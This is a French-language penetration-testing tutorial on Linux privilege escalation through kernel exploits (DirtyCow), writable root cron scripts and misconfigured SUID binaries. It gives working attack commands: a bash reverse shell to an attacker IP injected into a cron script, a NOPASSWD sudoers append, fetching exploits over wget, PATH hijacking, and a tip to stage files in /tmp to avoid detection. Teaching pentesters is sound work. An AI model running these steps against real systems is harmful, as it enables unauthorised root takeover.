# Linux Privilege Escalation

L'**élévation de privilèges** est le processus d'exploitation de vulnérabilités ou de mauvaises configurations pour élever l'accès d'un utilisateur peu privilégié à `root`. C'est une phase critique du cycle d'attaque et un déterminant majeur du succès d'un test d'intrusion.

> ⚠️ **Note** : Toutes les commandes supposent que vous avez déjà obtenu un **accès initial** au système Linux cible en tant qu'utilisateur peu privilégié. Remplacez les chemins et valeurs par les vôtres.

---

## Le Noyau Linux

Le **noyau** est le cœur du système d'exploitation — il a le contrôle total sur chaque ressource et composant matériel du système. Il agit comme une couche de traduction entre le matériel et le logiciel.

Les exploits du noyau Linux ciblent des vulnérabilités dans le noyau lui-même pour exécuter du code arbitraire avec le niveau de privilège le plus élevé — `root`. Le processus diffère selon :
- La **version du noyau** et la **distribution** ciblée.
- L'**exploit de noyau** spécifique utilisé.

> ⚠️ **Attention** : Les exploits de noyau peuvent provoquer des **crashs système et des pertes de données**. À éviter dans les environnements de production/entreprise sauf absolument nécessaire.

---

## Méthodologie d'Élévation de Privilèges

```
Obtenir l'Accès Initial → Énumérer le Système → Identifier les Vulnérabilités → Exploiter → Shell Root
```

### Étape 1 : Énumérer le Système

Une fois que vous avez un shell peu privilégié sur la cible :

```bash
# Version du noyau et architecture
uname -a
uname -r

# Distribution et version
cat /etc/issue
cat /etc/*-release

# Utilisateur actuel et privilèges
whoami
id
sudo -l
```

Notez la **version du noyau**, l'**architecture** (x86/x64), la **distribution** et la **version de distribution** — vous aurez besoin de tout cela pour trouver des exploits compatibles.

### Étape 2 : Vérifier les Gains Rapides d'Abord

Avant de recourir aux exploits de noyau, vérifiez toujours les chemins d'escalade plus simples :

```bash
# Vérifier les permissions sudo — pouvez-vous exécuter quelque chose en tant que root ?
sudo -l

# Trouver les binaires SUID appartenant à root
find / -user root -perm -4000 -type f 2>/dev/null

# Vérifier les cron jobs modifiables
cat /etc/crontab
ls -la /etc/cron.*
```

---

## 1. Exploitation du Noyau avec Linux-Exploit-Suggester

**Linux-Exploit-Suggester** évalue l'exposition du noyau donné face à tous les exploits de noyau Linux publiquement connus. Il identifie quels exploits s'appliquent à la version spécifique du noyau sur la cible.

> GitHub : https://github.com/mzet-/linux-exploit-suggester

### Étape 1 : Transférer Linux-Exploit-Suggester sur la Cible

Sur Kali, héberger le script :

```bash
python3 -m http.server 80
```

Sur la cible, le télécharger :

```bash
wget http://<votre_ip>/linux-exploit-suggester.sh -O /tmp/les.sh
chmod +x /tmp/les.sh
```

### Étape 2 : Exécuter l'Outil

```bash
/tmp/les.sh
```

La sortie liste les exploits de noyau applicables classés par exposition. Notez les **codes CVE** et noms d'exploits — utilisez-les pour trouver du code d'exploit compilé.

### Étape 3 : Trouver et Compiler l'Exploit

Exemple avec **DirtyCow (CVE-2016-5195)** — l'un des exploits de noyau Linux les plus célèbres, affectant les noyaux 2.6.22 à 4.8.3 :

```bash
# Sur Kali — rechercher l'exploit
searchsploit dirty cow

# Télécharger le code source de l'exploit
searchsploit -m 40616   # ou l'ID d'exploit pertinent
```

Compiler l'exploit sur Kali (ou sur la cible si un compilateur est disponible) :

```bash
gcc -pthread dirty.c -o dirtycow -lcrypt
```

### Étape 4 : Transférer et Exécuter l'Exploit

```bash
# Transférer l'exploit compilé sur la cible
wget http://<votre_ip>/dirtycow -O /tmp/dirtycow
chmod +x /tmp/dirtycow

# Exécuter
/tmp/dirtycow
```

> **Toujours uploader les fichiers d'exploit dans `/tmp`** — il est accessible en écriture par tous et moins susceptible d'être détecté.

> Exploits de noyau Linux par CVE : https://github.com/SecWiki/linux-kernel-exploits

---

## 2. Exploitation des Cron Jobs Mal Configurés

### Que sont les Cron Jobs ?

**Cron** est un planificateur de tâches basé sur le temps sous Linux. Il exécute des scripts et commandes automatiquement selon un planning défini. Chaque tâche planifiée est appelée un **Cron job**, et sa configuration est stockée dans le fichier **crontab**.

**Pourquoi ils importent pour l'élévation de privilèges** : Les Cron jobs configurés pour s'exécuter en tant que `root` exécutent leurs scripts avec les permissions root. Si un utilisateur peu privilégié peut **éditer ou remplacer** le script appelé, il peut injecter des commandes malveillantes qui s'exécutent en tant que root.

```
Cron Job Root → Exécute un Script → Script Modifiable → Injecter des Commandes → Shell Root
```

### Étape 1 : Identifier les Cron Jobs Root

```bash
# Voir le crontab système
cat /etc/crontab

# Vérifier les répertoires cron pour les tâches planifiées
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.weekly/

# Rechercher des références à des fichiers spécifiques exécutés
grep -rnw /usr -e "/home/<utilisateur>/nom_fichier"
```

### Étape 2 : Vérifier les Permissions sur le Script

Une fois que vous trouvez un script appelé par un cron job root :

```bash
ls -al /usr/local/share/copy.sh
```

Cherchez des **permissions d'écriture globales** (`-rwxrwxrwx` ou permissions d'écriture de groupe). Si n'importe quel utilisateur peut y écrire, vous pouvez injecter des commandes.

### Étape 3 : Injecter une Commande d'Élévation de Privilèges

**Méthode A — S'ajouter aux sudoers (sudo sans mot de passe)** :

```bash
printf '#!/bin/bash\necho "<votre_utilisateur> ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh
```

Attendez que le cron job s'exécute (vérifiez le planning dans `/etc/crontab`), puis :

```bash
sudo su
```

**Méthode B — Ajouter un reverse shell** :

```bash
printf '#!/bin/bash\nbash -i >& /dev/tcp/<votre_ip>/4444 0>&1' > /usr/local/share/copy.sh
```

Configurer un listener sur Kali :

```bash
nc -nlvp 4444
```

Attendez que le cron job se déclenche — vous recevrez un shell root.

### Étape 4 : Vérifier l'Accès Root

```bash
whoami   # Doit retourner : root
id
```

### Résumé de l'Élévation via Cron Jobs

| Condition | Résultat |
|-----------|---------|
| Script appelé par cron job root **modifiable** | Injecter des commandes → exécutées en tant que root |
| Script **n'existe pas** mais le chemin est dans crontab | Créer le script → exécuté en tant que root |
| Script utilise des **chemins relatifs** (sans chemin complet) | Hijacking de PATH possible |

---

## 3. Exploitation des Binaires SUID

### Qu'est-ce que SUID ?

**SUID (Set User ID)** est une permission de fichier spéciale sous Linux. Quand elle est définie sur un exécutable, elle permet au programme de s'exécuter avec les **permissions du propriétaire du fichier** plutôt que de l'utilisateur qui l'exécute.

En pratique : si un binaire **appartient à root** et a le **bit SUID défini**, tout utilisateur qui l'exécute le fait avec des **privilèges root** pendant cette exécution.

```
Utilisateur Non Privilégié → Exécute Binaire SUID → Binaire S'exécute en tant que Root → Élévation de Privilèges
```

SUID est légitime et nécessaire pour de nombreux binaires système (ex. `passwd` a besoin de root pour écrire dans `/etc/shadow`). La vulnérabilité survient quand les binaires SUID sont **mal configurés** ou **appellent des programmes externes** de manière non sécurisée.

### Étape 1 : Trouver Tous les Binaires SUID Appartenant à Root

```bash
find / -user root -perm -4000 -type f 2>/dev/null
```

Explication des flags :
- `-user root` — appartient à root
- `-perm -4000` — a le bit SUID défini
- `-type f` — fichiers réguliers uniquement
- `2>/dev/null` — supprimer les erreurs de permission

### Étape 2 : Inspecter le Binaire SUID

Utilisez `strings` pour lire le contenu lisible du binaire — cela révèle quels programmes ou commandes externes il appelle :

```bash
strings /chemin/vers/binaire_suid
```

Cherchez des appels à des **binaires externes sans chemins complets** (ex. `greetings` plutôt que `/usr/bin/greetings`) — ceux-ci sont exploitables via hijacking de PATH.

### Étape 3A : Remplacer le Binaire Appelé (Remplacement Direct)

Si le binaire SUID appelle un programme externe (ex. `greetings`) et que vous pouvez contrôler ce fichier :

```bash
# Supprimer le binaire original appelé
rm /chemin/vers/greetings

# Le remplacer par une copie de bash
cp /bin/bash /chemin/vers/greetings
```

Quand le binaire SUID s'exécute, il appellera votre copie de `bash` à la place — en l'exécutant en tant que root.

```bash
# Exécuter le binaire SUID
/chemin/vers/welcome
# Vous avez maintenant un shell root
whoami   # root
```

### Étape 3B : Hijacking de PATH

Si le binaire SUID appelle une commande externe par son nom uniquement (sans chemin complet), vous pouvez détourner `$PATH` pour lui faire exécuter votre version malveillante :

```bash
# Créer un script malveillant nommé comme le binaire appelé
echo '/bin/bash' > /tmp/greetings
chmod +x /tmp/greetings

# Préfixer /tmp au PATH pour que votre version soit trouvée en premier
export PATH=/tmp:$PATH

# Exécuter le binaire SUID — il trouve votre version en premier
/chemin/vers/welcome
```

### Étape 3C : Exploitation d'Objet Partagé Manquant

Si le binaire SUID tente de charger une **bibliothèque partagée (.so)** qui n'existe pas, vous pouvez en créer une malveillante :

```bash
# Trouver les objets partagés manquants
strace /chemin/vers/binaire_suid 2>&1 | grep "No such file"

# Créer un objet partagé malveillant
gcc -shared -fPIC -o /chemin/vers/manquant.so exploit.c
```

### Résumé des Méthodes d'Exploitation SUID

| Méthode | Quand l'Utiliser | Commande |
|---------|----------------|---------|
| **Remplacement direct** | Le chemin du binaire appelé est modifiable | `cp /bin/bash /chemin/vers/binaire_appele` |
| **Hijacking de PATH** | Le binaire appelle des programmes sans chemin complet | `export PATH=/tmp:$PATH` |
| **Objet partagé manquant** | Le binaire charge un fichier `.so` inexistant | Créer un `.so` malveillant au chemin attendu |

---

## Résumé des Techniques d'Élévation de Privilèges

| Technique | Outil/Méthode | Prérequis | Résultat |
|-----------|--------------|-----------|---------|
| **Exploit de noyau** | Linux-Exploit-Suggester + binaire | Version de noyau vulnérable | Shell root |
| **Abus de cron job** | Inspection manuelle + injection dans script | Script modifiable appelé par cron root | Shell root |
| **Binaire SUID** | `find` + `strings` + remplacement | Binaire SUID mal configuré | Shell root |
| **Mauvaise config sudo** | `sudo -l` | Commandes sudo autorisées | Shell root |

---

## Points Clés

- L'**élévation de privilèges** sous Linux élève l'accès d'un utilisateur peu privilégié à `root`.
- Toujours **énumérer d'abord** : `uname -a`, `id`, `sudo -l`, vérifier les binaires SUID, inspecter le crontab.
- **Vérifier les chemins simples avant les exploits de noyau** — sudo mal configuré, binaires SUID et scripts cron modifiables sont bien plus courants et stables.
- **Linux-Exploit-Suggester** identifie les exploits de noyau applicables pour la version spécifique — transférez-le sur la cible et exécutez-le là.
- **DirtyCow (CVE-2016-5195)** est l'un des exploits de noyau Linux les plus connus — affecte les noyaux 2.6.22 à 4.8.3.
- **Toujours uploader les fichiers d'exploit dans `/tmp`** — accessible en écriture par tous et moins surveillé.
- Les **Cron jobs** s'exécutant en tant que root avec des scripts modifiables sont une mauvaise configuration critique — injectez des commandes ou un reverse shell dans le script.
- Utilisez `grep -rnw /usr -e "<chemin_script>"` pour trouver quel cron job appelle un script spécifique.
- Les **binaires SUID** s'exécutent avec les permissions du propriétaire — s'ils appartiennent à root et sont mal configurés, ils accordent l'accès root.
- Utilisez `find / -user root -perm -4000 -type f 2>/dev/null` pour trouver tous les binaires SUID appartenant à root.
- Utilisez `strings <binaire>` pour inspecter quels programmes externes un binaire SUID appelle — cherchez les appels sans chemins complets.
- Le **hijacking de PATH** fonctionne quand un binaire SUID appelle des commandes externes sans spécifier le chemin complet.
- Le **remplacement direct** fonctionne quand le binaire externe appelé par SUID est dans un emplacement modifiable — remplacez-le par `/bin/bash`.
- Les exploits de noyau sont le **dernier recours** — instables et risquent de faire crasher le système.
